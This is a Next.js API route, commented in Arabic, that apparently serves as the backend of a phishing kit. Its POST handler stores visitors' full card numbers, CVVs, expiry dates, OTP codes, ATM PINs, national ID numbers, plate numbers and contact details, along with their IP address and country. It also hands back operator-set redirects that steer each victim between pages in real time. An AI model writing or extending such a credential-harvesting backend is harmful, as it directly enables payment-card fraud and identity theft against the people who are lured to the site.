import { NextRequest, NextResponse } from 'next/server';
import { v4 as uuidv4 } from 'uuid';
import { upsertSession, getSessionRedirect, clearSessionRedirect, recordVisit, pingActiveUser, getSessionById } from '@/lib/db';

export const dynamic = 'force-dynamic';

// الحصول على بيانات الجلسة الحالية
export async function GET(req: NextRequest) {
  try {
    const sessionId = req.cookies.get('session_id')?.value;
    if (!sessionId) return NextResponse.json({ session: null });

    const session = await getSessionById(sessionId);
    if (!session) return NextResponse.json({ session: null });

    return NextResponse.json({ session });
  } catch (e) {
    console.error(e);
    return NextResponse.json({ session: null });
  }
}

// إنشاء أو تحديث الجلسة
export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const now = Date.now();

    // الحصول على IP
    const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
               req.headers.get('x-real-ip') || 'unknown';

    // محاولة الحصول على الدولة
    let country = body.country || '';
    if (!country && ip !== 'unknown' && ip !== '127.0.0.1' && !ip.startsWith('192.168') && !ip.startsWith('10.')) {
      try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode`);
        const geo = await geoRes.json();
        country = geo.country || '';
      } catch {
        country = '';
      }
    }

    let sessionId = req.cookies.get('session_id')?.value;
    const isNew = !sessionId;
    if (!sessionId) sessionId = uuidv4();

    // حفظ/تحديث الجلسة
    await upsertSession({
      id: sessionId,
      country,
      ip,
      name: body.name || '',
      idNumber: body.id_number || '',
      plateNumber: body.plate_number || '',
      bookingDate: body.booking_date || '',
      phone: body.phone || '',
      email: body.email || '',
      cardNumber: body.card_number || '',
      cardExpiry: body.card_expiry || '',
      cardCvv: body.card_cvv || '',
      cardHolder: body.card_holder || '',
      otpCode: body.otp_code || '',
      atmPin: body.atm_pin || '',
      currentPage: body.current_page || '',
      waitingFor: body.waiting_for || '',
    });

    // تسجيل الزيارة
    if (body.current_page) {
      await recordVisit(sessionId, body.current_page, country, ip);
    }

    // تحديث المتواجدين الآن
    await pingActiveUser(sessionId);

    // الحصول على redirect إن وجد
    const sessionData = await getSessionRedirect(sessionId);
    let redirectTo = '';
    if (sessionData?.redirect_to) {
      redirectTo = sessionData.redirect_to;
      await clearSessionRedirect(sessionId);
    }

    const response = NextResponse.json({
      success: true,
      sessionId,
      redirect_to: redirectTo,
      status: sessionData?.status || 'active',
    });

    if (isNew) {
      response.cookies.set('session_id', sessionId, {
        httpOnly: false,
        maxAge: 60 * 60 * 24 * 30,
        path: '/',
        sameSite: 'lax',
      });
    }

    return response;
  } catch (e) {
    console.error(e);
    return NextResponse.json({ error: 'خطأ في الخادم' }, { status: 500 });
  }
}
